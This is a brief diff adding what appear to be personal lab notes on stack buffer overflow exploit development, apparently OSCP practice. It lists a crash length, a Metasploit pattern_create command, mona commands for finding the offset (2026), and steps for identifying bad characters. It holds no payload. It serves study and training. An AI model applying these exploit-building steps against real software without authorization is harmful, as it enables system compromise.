@@ -1,0 +1,10 @@
+-Crash:2100
+┌──(hui㉿kali)-[~/buffer_overflow]
+└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
+!mona findmsp -distance 2500
+-offset=2026
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\oscp\bytearray.bin -a 018BFA30
+Possibly bad chars: a9 aa cd ce d4 d5
+!mona bytearray -b "\x00\xa9\xcd\xd4"(True)
+
